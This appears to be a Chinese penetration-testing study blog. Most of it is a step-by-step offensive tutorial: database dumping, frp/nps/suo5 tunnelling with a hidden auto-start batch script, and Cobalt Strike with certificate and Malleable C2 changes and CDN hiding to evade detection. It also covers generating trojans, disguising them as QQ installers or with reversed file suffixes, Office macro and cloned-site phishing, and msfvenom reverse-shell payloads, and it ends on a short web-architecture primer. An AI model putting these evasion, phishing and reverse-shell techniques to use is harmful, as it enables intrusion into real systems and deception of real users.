<h2 id="数据库安全防范"><a href="#数据库安全防范" class="headerlink" title="数据库安全防范"></a>数据库安全防范</h2><ol>
<li>限止数据库远程连接，给数据库帐户设置密码必须&gt;8位以上并数字+字母+特殊符号等。</li>
<li>不要给网站配置root或SA权限。必须给每个网站独立分配数据库帐户并限格控制好权限。</li>
<li>及时升级数据库补丁。</li>
<li>安装Waf进行防御。</li>
<li>购买数据库审计设备</li>
</ol>
<h1 id="数据库脱库"><a href="#数据库脱库" class="headerlink" title="数据库脱库"></a>数据库脱库</h1><h2 id="工具脱库"><a href="#工具脱库" class="headerlink" title="工具脱库"></a>工具脱库</h2><p>通过百度查找Navicat Mysql、Navicat for SQL Server、Navicat for Oracle、Navicat for PostgreSQL、Navicat for SQLite等，也可以使用其它工具代替，如sqlmap、k8等类似工具。<br><strong>优点：</strong> 支持面广，功能强大，速度度、稳定<br><strong>缺点：</strong> 不能支持外链</p>
<h2 id="脚本脱库"><a href="#脚本脱库" class="headerlink" title="脚本脱库"></a>脚本脱库</h2><p>通过百度查找ASP、PHP、JSP脱库脚本等类似工具。<br><strong>优点：</strong> 解决不外链的情况<br><strong>缺点：</strong> 速度慢、不够稳定</p>
<h2 id="站点打包"><a href="#站点打包" class="headerlink" title="站点打包"></a>站点打包</h2><p>通过百度查找ASP、PHP、JSP脚本打包程序等类似工具。<br>asp+access源码和数据库是可以一起打包，其它类型数据库，库与源码是单独分开的。</p>
<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p><a href="https://blog.csdn.net/qq_53568983/article/details/143032581">【蓝队技能】【内网隧道工具流量分析】FRP&amp;NPS&amp;reGeorg&amp;Venom_frp流量分析-CSDN博客</a></p>
<h2 id="nps逆向穿透"><a href="#nps逆向穿透" class="headerlink" title="nps逆向穿透"></a>nps逆向穿透</h2><p>项目地址：<a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a></p>
<p>实验架构图</p>
<img src="/img/oldboy/image-20250302205921712-1740920363278-1.png" alt="image-20250302205921712" style="zoom:50\%;" />



<p>1、nps配置（双网卡主机）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装相关依赖（需要管理员权限）</span></span><br><span class="line">C:\neiwang\windows_amd64_server\nps.exe install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动nps服务（需要管理员权限）</span></span><br><span class="line">C:\neiwang\windows_amd64_server\nps.exe start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.138.132:8080/login/index</span><br><span class="line">账号 admin  密码 123</span><br></pre></td></tr></table></figure>





<p><img src="/img/oldboy/image-20250302210807232.png" alt="image-20250302210807232"></p>
<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>创建隧道实现内网PC机的端口映射</p>
<p><img src="/img/oldboy/image-20250302212344121.png" alt="image-20250302212344121"></p>
<p><img src="/img/oldboy/image-20250302213050580-1740922252555-3.png" alt="image-20250302213050580"></p>
<p>2、npc配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">客户端开启服务</span></span><br><span class="line">./npc.exe -server=192.168.138.132:8024 -vkey=123456 -type=tcp</span><br></pre></td></tr></table></figure>





<img src="/img/oldboy/image-20250302213155368.png" alt="image-20250302213155368" style="zoom:50\%;" />



<p><img src="/img/oldboy/image-20250302213443822.png" alt="image-20250302213443822"></p>
<p>使用外网服务器远程连接192.168.138.132:8022端口</p>
<img src="/img/oldboy/image-20250302213323169.png" alt="image-20250302213323169" style="zoom:50\%;" />





<h3 id="流量转发"><a href="#流量转发" class="headerlink" title="流量转发"></a>流量转发</h3><p>nps创建socks代理</p>
<img src="/img/oldboy/image-20250302213652535-1740922614079-5.png" alt="image-20250302213652535" style="zoom:50\%;" />



<p>使用Proxifier代理</p>
<p>创建代理服务器</p>
<img src="/img/oldboy/image-20250302214052182.png" alt="image-20250302214052182" style="zoom:50\%;" />



<p>创建代理服务器</p>
<p>启动代理规则</p>
<img src="/img/oldboy/image-20250302214709180.png" alt="image-20250302214709180" style="zoom:50\%;" />







<p>配置当访问192.168.50.0-192.168.50.255使用代理服务器</p>
<p><img src="/img/oldboy/image-20250302220122380.png" alt="image-20250302220122380" style="zoom:50\%;" />使用本机测试是否能ping通</p>
<img src="/img/oldboy/image-20250302220025607.png" alt="image-20250302220025607" style="zoom: 50\%;" />



<p>但是无法ping通C主机。</p>
<img src="/img/oldboy/image-20250302220342320.png" alt="image-20250302220342320" style="zoom:25\%;" />

<p>验证成功！</p>
<h2 id="frp反向代理穿透"><a href="#frp反向代理穿透" class="headerlink" title="frp反向代理穿透"></a>frp反向代理穿透</h2><p>GitHub：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
<img src="/img/oldboy/image-20250302205921712-1740920363278-1.png" alt="image-20250302205921712" style="zoom:50\%;" />



<p><strong>1、服务端配置</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">token = 123456</span><br><span class="line">dashboard_port = 7500</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = admin</span><br><span class="line">enable_prometheus = true</span><br></pre></td></tr></table></figure>



<p>启动frpc(不同操作系统，配置文件不同)</p>
<p>frps.exe -c frps.toml</p>
<p>访问<a href="http://192.168.138.132:7500/">http://192.168.138.132:7500/</a></p>
<p><img src="/img/oldboy/image-20250302222451071.png" alt="image-20250302222451071"></p>
<p><strong>2、客户端配置</strong></p>
<p>将frpc.exe和frpc.toml上传到客户端</p>
<p>修改frpc.exe</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端配置</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 服务器ip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">与frps.ini的bind_port⼀致</span></span><br><span class="line">server_port = 7000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">与frps.ini的token⼀致</span></span><br><span class="line">token = 123456</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置ssh服务</span></span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个⾃定义，之后再ssh连接的时候要⽤</span></span><br><span class="line">remote_port = 6000</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rdp配置远程连接</span></span><br><span class="line">[rdp]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port =3389</span><br><span class="line">remote_port = 7002</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置http服务，可⽤于⼩程序开发、远程调试等，如果没有可以不写下⾯的</span></span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 8080</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">web域名</span></span><br><span class="line">subdomain = test.hijk.pw</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">⾃定义的远程服务器端⼝，例如8080</span></span><br><span class="line">remote_port = 8080</span><br></pre></td></tr></table></figure>



<p>上⾯frpc.ini的rdp字段都是⾃⼰定义的规则，⾃定义端⼝对应时格式如下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[xxx]”表示⼀个规则名称，⾃⼰定义，便于查询即可。</span><br><span class="line"></span><br><span class="line">“type”表示转发的协议类型，有TCP和UDP等选项可以选择，如有需要请⾃⾏查询frp⼿册。</span><br><span class="line"></span><br><span class="line">“local_port”是本地应⽤的端⼝号，按照实际应⽤⼯作在本机的端⼝号填写即可。</span><br><span class="line"></span><br><span class="line">“remote_port”是该条规则在服务端开放的端⼝号，⾃⼰填写并记录即可。</span><br></pre></td></tr></table></figure>





<p>RDP</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">即Remote Desktop 远程桌⾯，Windows的RDP默认端⼝是3389，协议为TCP，建议使⽤frp远程</span><br><span class="line">连接前，在局域⽹中测试好，能够成功连接后再使⽤frp穿透连接。</span><br></pre></td></tr></table></figure>



<p>配置完成frpc.ini后，就可以运⾏frpc了,注意防⽕墙要放⾏remote_port端⼝</p>
<p>在cs的输⼊beacon命令启动客户端</p>
<p>cd C:frp</p>
<p>shell frpc.exe -c frpc.ini</p>
<p>启动后服务器端操作界⾯会回显⼀个连接</p>
<p><img src="/img/oldboy/image-20250302224813994.png" alt="image-20250302224813994"></p>
<p>此时可以在局域⽹外使⽤相应程序访问 x.x.x.x:xxxx （IP为VPS的IP，端⼝为⾃定义的remote_port）即</p>
<p>可访问到相应服务</p>
<p>使⽤远程桌⾯进⾏连接</p>
<p><img src="/img/oldboy/image-20250302224842021.png" alt="image-20250302224842021"></p>
<h3 id="客户端后台运⾏及开机⾃启"><a href="#客户端后台运⾏及开机⾃启" class="headerlink" title="客户端后台运⾏及开机⾃启"></a>客户端后台运⾏及开机⾃启</h3><p>frpc运⾏时始终有⼀个命令⾏窗⼝运⾏在前台，影响美观，我们可以使⽤⼀个批处理⽂件来将其运⾏在</p>
<p>后台，⽽且可以双击执⾏，每次打开frpc不⽤再⾃⼰输命令了。</p>
<p>在任何⼀个⽬录下新建⼀个⽂本⽂件并将其重命名为“frpc.bat”，编辑，粘贴如下内容并保存。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">if &quot;\%1&quot; == &quot;h&quot; goto begin</span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;\%~nx0&quot;&quot; h&quot;,0)</span><br><span class="line">(window.close)&amp;&amp;exit</span><br><span class="line">:begin</span><br><span class="line">REM</span><br><span class="line">cd C:\frp</span><br><span class="line">frpc -c frpc.ini</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>



<p>将cd后的路径更改为你的frpc实际存放的⽬录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">之后直接运⾏这个 .bat ⽂件即可启动frpc并隐藏窗⼝（可在任务管理器中退出）。</span><br><span class="line">⾄于开机启动，把这个 .bat ⽂件直接扔进Windows的开机启动⽂件夹就好了 :)</span><br><span class="line">⾄此，客户端配置完成，之后就是你⾃⼰根据需要在frpc.ini后追加规则即可。</span><br><span class="line">强烈建议你在使⽤frp直接测试内⽹穿透前，先在局域⽹内测试好相关功能的正常使⽤，并配置好可</span><br><span class="line">能会影响的Windows防⽕墙等内容，在内⽹调试通过后再使⽤frp进⾏内⽹穿透测试。</span><br></pre></td></tr></table></figure>





<p><a href="https://www.cnblogs.com/hackmang/p/14516969.html">frp+proxifier实现内网socks5反向代理 - 枕桃花吹长笛 - 博客园</a></p>
<h2 id="正向代理穿透"><a href="#正向代理穿透" class="headerlink" title="正向代理穿透"></a>正向代理穿透</h2><p>需要将恶意文件上传到服务端</p>
<p><a href="https://github.com/zema1/suo5/tree/main/assets">suo5&#x2F;assets at main · zema1&#x2F;suo5</a></p>
<p>针对不同的前端页面上传不同的恶意文件</p>
<p><img src="/img/oldboy/image-20250303101252469.png" alt="image-20250303101252469"></p>
<p>使用链接工具进行连接</p>
<img src="/img/oldboy/image-20250303102504174.png" alt="image-20250303102504174" style="zoom:50\%;" />







<p>非图形化命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./suo5 -t https://example.com/proxy.jsp -l 127.0.0.1:1111</span> </span><br></pre></td></tr></table></figure>







<p>使用proxifier或者使用火狐配置代理端口即可使用</p>
<h1 id="渗透测试工具"><a href="#渗透测试工具" class="headerlink" title="渗透测试工具"></a>渗透测试工具</h1><h2 id="Cobalt-Striket提权工具"><a href="#Cobalt-Striket提权工具" class="headerlink" title="Cobalt Striket提权工具"></a>Cobalt Striket提权工具</h2><p>介绍：CobaltStrike集成了端口转发、服务扫描、自动化溢出、多模式端口监听、Windows exe木马生成、Windows dll木马生成、Java木马生成、Office 宏病毒生成、木马捆绑浏览器自动攻击等强大的功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。</p>
<p>项目地址：<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a></p>
<h3 id="CS流量隐藏"><a href="#CS流量隐藏" class="headerlink" title="CS流量隐藏"></a>CS流量隐藏</h3><p>一、HTTP&#x2F;HTTPS 流量特征</p>
<p>​	 默认证书特征  </p>
<p>​		默认使用自签名SSL证书，证书信息包含固定字段： CN&#x3D;Major Cobalt Strike、Alias name: cobaltstrike。 </p>
<p>​		检测建议：检查TLS证书的Subject和Issuer字段，匹配固定关键字。 </p>
<p>​	URI路径的checksum8规则  </p>
<p>​		Stager下载Stage时，HTTP请求路径需满足 ASCII码之和 % 256 &#x3D; 92（如 &#x2F;Yle2、&#x2F;cKTZ）。</p>
<p>​		 检测建议：对URI路径动态计算checksum8值，匹配结果为92的请求。 </p>
<p>​	心跳包特征 </p>
<p>​		 Beacon与C2的HTTP心跳包间隔固定（默认60秒），上下行数据长度固定。 </p>
<p>​		检测建议：分析流量中周期性固定长度的GET&#x2F;POST请求。 </p>
<p>​	HTTP头异常  </p>
<p>​		默认配置中Cookie字段携带Base64加密的元数据，且User-Agent可能固定（旧版本）或随机但无浏览器特征。</p>
<p>​		检测建议：检查Cookie字段是否包含Base64编码的异常数据。 </p>
<p>二、DNS 流量特征</p>
<p>​	 异常DNS查询  </p>
<p>​		DNS Beacon使用 www.、api.、post. 等前缀发起A&#x2F;TXT记录查询。</p>
<p>​		响应结果包含非常规IP（如 0.0.0.0、0.0.0.241）。 </p>
<p>​		检测建议：监控异常DNS查询模式及非标准响应IP。 </p>
<p>​	TXT记录载荷传输  </p>
<p>​		使用TXT记录传输加密后的指令或数据，查询内容包含长随机字符串。 </p>
<p>​		检测建议：分析TXT记录长度和频率，匹配加密数据特征。 </p>
<p>三、强特征（需源码级修改）</p>
<p>​	 JA3&#x2F;JA3S指纹</p>
<p>​		TLS握手阶段的Client Hello（JA3）和Server Hello（JA3S）存在固定哈希值（如 72a589da586844d7f0818ce684948eea）。 </p>
<p>​		检测建议：提取TLS握手阶段的JA3&#x2F;JA3S哈希值进行匹配。 Stager响应特征  即使修改URI路径，默认仍响应符合checksum8规则的请求（如访问任意路径返回Stage）。 </p>
<p>​		检测建议：对未配置的URI路径返回210KB左右数据的服务器进行标记。</p>
<h4 id="修改证书特征值"><a href="#修改证书特征值" class="headerlink" title="修改证书特征值"></a>修改证书特征值</h4><p>1、cobalt strike 默认的证书存在cobalt strike 的指纹信息。需要keytool (Java数据证书的管理工具) 修改证书信息，创建新的cobaltstrike.store。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">keytool.exe -keystore test.store -storepass test2025 -keypass test2025 -genkey -keyalg RSA -alias test.com -dname &quot;CN=test e-Szigno Root CA, OU=e-Szigno CA, O=test Ltd., L=Budapest, ST=HU, C=HU&quot;</span><br></pre></td></tr></table></figure>



<p>ps:推荐在cs文件夹下运行该命令</p>
<p>2、使用github中其他流量的特征值</p>
<p>地址：<a href="https://github.com/xx0hcd/Malleable-C2-Profiles">https://github.com/xx0hcd/Malleable-C2-Profiles</a></p>
<p>我们就用office365_calendar.profile来举例</p>
<p>我们要修改的是此文件中用到我们刚刚生成证书的信息(配置文件没有，需要手动添加信息)</p>
<p>https-certificate {</p>
<p>​	set CN “test e-Szigno Root CA”;</p>
<p>​	set O “test Ltd”;</p>
<p>​	set C “HU”;</p>
<p>​	set L “US”;</p>
<p>​	set OU “e-Szigno CA”;</p>
<p>​	set ST “HU”;</p>
<p>​	set validity “365”;</p>
<p>}</p>
<p>#设置，修改成你的证书名称和证书密码</p>
<p>code-signer{</p>
<p>​	set keystore “test.store”;</p>
<p>​	set password “test2025”;</p>
<p>​	set alias “test.com”;</p>
<p>}</p>
<p>3、最后我们将这2个文件同时放到vps上启动</p>
<p>.&#x2F;teamserver ip 密码 office365_calendar.profile</p>
<p>可以修改.&#x2F;teamserver 端口实现敏感端口绕过</p>
<h4 id="CDN接入"><a href="#CDN接入" class="headerlink" title="CDN接入"></a>CDN接入</h4><p>使用CDN内容分发网络的多节点分布式技术，通过“加速、代理、缓存”隐藏在后面的静态文件或服务；最终实现对外暴露的是CDN多节点的公网域名IP，很难甚至无法溯源真实后端服务器的域名或IP</p>
<p>1、开启一个listen</p>
<p>​	NAME:随便填写<br>​	Payload：选择Beacon http<br>​	HTTP hosts：写入自己的域名<br>​	HTTP host(Stager):写入自己的域名<br>​	HTTP Port（C2）：写入8880端口，可以访问到的都可以。<br>​	HTTP header：写入自己的域名</p>
<img src="/img/oldboy/1-51.png" style="zoom:50\%;" />

<p>需要配置域名，然后免费申请CDN</p>
<p><a href="https://blog.csdn.net/2301_80115097/article/details/138341090">内网神器Cobalt Strike隐藏特征与流量混淆._cobaltstrike cdn-CSDN博客</a></p>
<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="服务端启动"><a href="#服务端启动" class="headerlink" title="服务端启动"></a>服务端启动</h4><p>服务端一般部署在云主机Linux操作系统中</p>
<p>服务端启动（基于Java环境需要安装jdk）本次运行环境为Linux。切换到程序目录，运行程序+真实IP+密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">赋予执行权限</span></span><br><span class="line">chmod +x teamserver</span><br><span class="line">chmod +x TeamServerImage</span><br><span class="line"> </span><br><span class="line">./teamserver 192.168.138.129 geekgold</span><br></pre></td></tr></table></figure>

<img src="/img/oldboy/1-30.png" style="zoom:50\%;" />



<h4 id="客户端启动"><a href="#客户端启动" class="headerlink" title="客户端启动"></a>客户端启动</h4><img src="/img/oldboy/1-31.png" style="zoom:50\%;" />



<p>注意：需要保持服务端和客户端的版本一致</p>
<h4 id="EXE可执行文件"><a href="#EXE可执行文件" class="headerlink" title="EXE可执行文件"></a>EXE可执行文件</h4><p>1、创建监听器</p>
<img src="/img/oldboy/1-32.png" style="zoom: 33\%;" />





<p>2、生成木马</p>
<img src="/img/oldboy/1-33.png" style="zoom: 50\%;" />



<p>将文件保存到桌面即可</p>
<p>3、通过钓鱼、社工的方式将可执行exe文件发送至靶机，并诱导点击</p>
<img src="/img/oldboy/1-34.png" style="zoom:50\%;" />



<h5 id="木马隐藏（压缩法）"><a href="#木马隐藏（压缩法）" class="headerlink" title="木马隐藏（压缩法）"></a>木马隐藏（压缩法）</h5><p>1、设置为压缩文件</p>
<img src="/img/oldboy/1-36.png" style="zoom:50\%;" />



<p>设置文件自解压至指定文件夹（尽量选择用户含有的文件夹）</p>
<img src="/img/oldboy/1-37.png" style="zoom:50\%;" />



<p>先解压外壳文件QQ的安装软件，然后运行木马文件</p>
<img src="/img/oldboy/1-38.png" style="zoom:50\%;" />

<p>隐藏文件</p>
<img src="/img/oldboy/1-39.png" style="zoom:50\%;" />



<img src="/img/oldboy/1-40.png" style="zoom:50\%;" />



<p>2、使用Restorator2018，将QQ安装包，以及EXE文件拖到程序里</p>
<p>这里可以看到压缩之后的文件，图标发生了改变，需要将图标进行替换</p>
<p><strong>别忘记crtl+s保存，使之生效</strong></p>
<img src="/img/oldboy/1-35.png" style="zoom:50\%;" />



<p>双击测试：</p>
<p><img src="/img/oldboy/1-41.png"></p>
<p>上线成功</p>
<p><img src="/img/oldboy/1-42.png"></p>
<h5 id="文件反转法"><a href="#文件反转法" class="headerlink" title="文件反转法"></a>文件反转法</h5><p>通过将EXE文件后缀反转的方式，隐藏exe后缀</p>
<p>将文件命名为cmdgpj.exe</p>
<img src="/img/oldboy/1-44.png" style="zoom:50\%;" />



<p>在线生成图标：<a href="https://www.bitbug.net/">https://www.bitbug.net/</a></p>
<p>打开Resource Hacker工具，在file中open打开exe木马文件，选择上传图标，crtl+s保存</p>
<img src="/img/oldboy/1-45.png" style="zoom:50\%;" />

<p>生成图标</p>
<img src="/img/oldboy/1-47.png" style="zoom:33\%;" />



<p>诱导点击使之上线</p>
<p> <img src="/img/oldboy/1-46.png"></p>
<h4 id="office宏钓鱼"><a href="#office宏钓鱼" class="headerlink" title="office宏钓鱼"></a>office宏钓鱼</h4><p>首先cs生成宏</p>
<img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps1.jpg" alt="img" style="zoom:50\%;" /> 

<p>选择复制</p>
<img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps2.jpg" alt="img" style="zoom:50\%;" /> 

<p>新建一个word</p>
<p>打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定” 。</p>
<img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps3.jpg" alt="img" style="zoom:50\%;" /> 

<p>编写主体内容后，点击 “开发工具 — Visual Basic”，双击 “ThisDocument”<br>，将原有内容全部清空，然后将宏payload全部粘贴进去，保存并关闭该 VBA 编辑器 。</p>
<img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps4.jpg" alt="img" style="zoom:50\%;" /> 

<p>另存为</p>
<img src="file:///C:\Users\ZhuanZ\AppData\Local\Temp\ksohtml13624\wps5.jpg" alt="img" style="zoom:50\%;" /> 





<h4 id="克隆网站钓鱼"><a href="#克隆网站钓鱼" class="headerlink" title="克隆网站钓鱼"></a>克隆网站钓鱼</h4><p>示例页面：<a href="http://www.9377.com/login.php">网页游戏平台_精品手游_一起玩更快乐-9377网页游戏</a></p>
<p>使用cs克隆网站登录页面</p>
<img src="/img/oldboy/1-48.png" style="zoom:50\%;" />







<p>获得attack url：<a href="http://192.168.138.129:81/">http://192.168.138.129:81/</a></p>
<p>诱导用户点击</p>
<img src="/img/oldboy/1-49.png" style="zoom:50\%;" />



<p>查看weblog记录</p>
<img src="/img/oldboy/1-50.png" style="zoom: 33\%;" />



<h3 id="MSF联动"><a href="#MSF联动" class="headerlink" title="MSF联动"></a>MSF联动</h3><p>CS Server端和CS Client端工具开启方式直接略过</p>
<h4 id="CS反弹shell到MSF"><a href="#CS反弹shell到MSF" class="headerlink" title="CS反弹shell到MSF"></a>CS反弹shell到MSF</h4><p>参考资料:<a href="https://blog.csdn.net/Zlirving_/article/details/113862910">https://blog.csdn.net/Zlirving_/article/details/113862910</a></p>
<p>先建立监听器</p>
<p>上线</p>
<img src="/img/oldboy/wps1.jpg" alt="img" style="zoom: 80\%;" /> 

 

<p>Msf进入监听模块</p>
<p>​	use exploit&#x2F;multi&#x2F;handler</p>
<p>​	set payload windows&#x2F;meterpreter&#x2F;reverse_http</p>
<p>​	set lhost 192.168.0.109</p>
<p>​	set lport 8011</p>
<p>​	Exploit</p>
<p>CS添加监听器</p>
<p><img src="/img/oldboy/wps2.jpg" alt="img"></p>
<p>右键上线的主机，增加会话</p>
<p><img src="/img/oldboy/wps3.jpg" alt="img"> </p>
<p>或者直接spawn cs-msf（监听器名称）</p>
<p><img src="/img/oldboy/wps4.jpg" alt="img"> </p>
<p>Msf的联动成功</p>
<h4 id="MSF反弹shell到CS"><a href="#MSF反弹shell到CS" class="headerlink" title="MSF反弹shell到CS"></a>MSF反弹shell到CS</h4><p>msf制作木马进行上线</p>
<p>​	msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.102 LPORT&#x3D;4444 -f exe -o msf.exe</p>
<p>进入msf监听模块</p>
<p>​	use exploit&#x2F;multi&#x2F;handler</p>
<p>设置payload反弹shell（使用和木马相同的payload）</p>
<p>​	set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
<p>设置LHOST、LPORT参数</p>
<p>​	set LHOST 192.168.31.24(本地IP）</p>
<p>​	set LPORT 4444（设置的端口）</p>
<p>​	show options</p>
<p>开始攻击</p>
<p><img src="/img/oldboy/wps5.jpg" alt="img"> </p>
<p>后台运行</p>
<p><img src="/img/oldboy/wps6.jpg" alt="img"> </p>
<p>启动CS并创建监听器</p>
<p><img src="/img/oldboy/wps7.jpg" alt="img"> </p>
<p>MSF上使用payload_inject模块</p>
<p>​	use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject &#x2F;&#x2F;使用该模块可以将 Metasploit 获取到的会话注入到CS中</p>
<p>​	set payload windows&#x2F;meterpreter&#x2F;reverse_http &#x2F;&#x2F;和cs监听器保持一致</p>
<p>​	set prependmigrate true </p>
<p>​	set DisablePayloadHandler true &#x2F;&#x2F;用来禁用 Metasploit payload handler的监听 因为要监听到cs上</p>
<p>​	set lhost 192.168.0.109   &#x2F;&#x2F;CS的IP</p>
<p>​	set lport 1111  &#x2F;&#x2F;CS上的listen端口</p>
<p>​	set session 7  &#x2F;&#x2F;要转发的session</p>
<p><img src="/img/oldboy/wps8.jpg" alt="img"> </p>
<p>Run</p>
<p><img src="/img/oldboy/wps9.jpg" alt="img"> </p>
<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><p>看到报警平台报警存在外连，可能是通过cs工具外连解决思路：</p>
<p>当CS配置了域前置，通过ping或者查看外连端口的IP，放到危险报警平台分析，通常会显示正常的CDN服务器，将CDN所在的服务厂商直接封禁掉，或者直接把他的域名禁止掉。</p>
<p>注意：进程号是rundll32.exe，可能是远控端口</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>老男孩安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>老男孩安全</tag>
      </tags>
  </entry>
  <entry>
    <title>小迪安全--基础讲解(1)</title>
    <url>/posts/e1dc7286.html</url>
    <content><![CDATA[<h1 id="WEB服务搭建方式"><a href="#WEB服务搭建方式" class="headerlink" title="WEB服务搭建方式"></a>WEB服务搭建方式</h1><h2 id="常规化搭建"><a href="#常规化搭建" class="headerlink" title="常规化搭建"></a>常规化搭建</h2><p>​	原理：直接将源码、中间件、数据库搭建在同一个服务器</p>
<p>​	影响：无，使用常规的渗透测试方法即可</p>
<h2 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h2><p>​	原理：源码和数据库不在同一个服务器</p>
<p>​	影响：数据被单独存放，能连接才可影响数据；比较安全</p>
<h2 id="前后端分离"><a href="#前后端分离" class="headerlink" title="前后端分离"></a>前后端分离</h2><p>​	原理：前端JS框架，通过API传输数据</p>
<p>​	影响：</p>
<p>​		前端页面大部分不存在漏洞</p>
<p>​		后端管理大部分不在同域名</p>
<p>​		获得权限有可能不影响后端</p>
<h2 id="集成软件搭建"><a href="#集成软件搭建" class="headerlink" title="集成软件搭建"></a>集成软件搭建</h2><p>​	原理：打包类的集成化环境。权限配置或受控制</p>
<p>​	影响：</p>
<p>​		默认情况下，使用phpstudy搭建获得的webshell的权限较大</p>
<p>​		使用灯塔搭建的网站，具有一定的安全机制</p>
<h2 id="使用WAF搭建"><a href="#使用WAF搭建" class="headerlink" title="使用WAF搭建"></a>使用WAF搭建</h2><p>WAF：WEB应用防火墙</p>
<p><img src="/img/xiaodi/image-20250420102628560.png" alt="image-20250420102628560"></p>
<p>影响：</p>
<p>​	常规的渗透方法可能被拦截，需要使用绕过WAF手法进行绕过</p>
<h2 id="使用CDN"><a href="#使用CDN" class="headerlink" title="使用CDN"></a>使用CDN</h2><p>原理：内容分发服务，用户访问Web网站提供多地域响应，提高访问速度</p>
<p>影响：隐藏真实源IP，导致对目标测试错误</p>
<h2 id="使用OSS存储桶"><a href="#使用OSS存储桶" class="headerlink" title="使用OSS存储桶"></a>使用OSS存储桶</h2><p>原理：提供对象存储服务</p>
<p>使用方式：</p>
<p>​	1、开通OSS</p>
<p>​	2、新建Bucket</p>
<p>​	3、配置Bucket属性</p>
<p>​	4、配置Access访问</p>
<p>影响：上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储<br>    1、修复上传安全<br>    2、文件解析不一样<br>    3、但存在Accesskey隐患</p>
<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>负载均衡就是一种计算机网络技术，用来在多个计算机（计算机集群）、网络连接、CPU、磁碟驱动器或其他资源中分配负载，以达到最佳化资源使用、最大化吞吐率、最小化响应时间、同时避免过载的目的。</p>
<p>原理：分摊到多个操作单元上进行执行，共同完成工作任务</p>
<p>影响：有多个服务器加载服务，测试过程中存在多个目标情况</p>
<p><img src="https://pic2.zhimg.com/v2-8c1cfe007a2b5b64d221a20a335a9333_1440w.jpg" alt="img"></p>
<p>正反向代理</p>
<h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>正向代理是一种位于客户端和原始服务器之间的服务器，它接收客户端的请求并将其转发给原始服务器，然后将服务器的响应返回给客户端（不代理不可达）</p>
<p><img src="/img/xiaodi/image-20250420104147752.png" alt="image-20250420104147752"></p>
<p>​	</p>
<h3 id="2反向代理"><a href="#2反向代理" class="headerlink" title="2反向代理"></a>2反向代理</h3><p>通过网络反向代理转发真实服务达到访问目的影响：访问目标只是一个代理，非真实应用服务器</p>
<p><img src="/img/xiaodi/image-20250420104426621.png" alt="image-20250420104426621"></p>
<p>原理：通过网络反向代理转发真实服务达到访问目的影响：访问目标只是一个代理，非真实应用服务器</p>
<p>注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！</p>
<h1 id="APP应用开发架构"><a href="#APP应用开发架构" class="headerlink" title="APP应用开发架构"></a>APP应用开发架构</h1><p>1、原生开发</p>
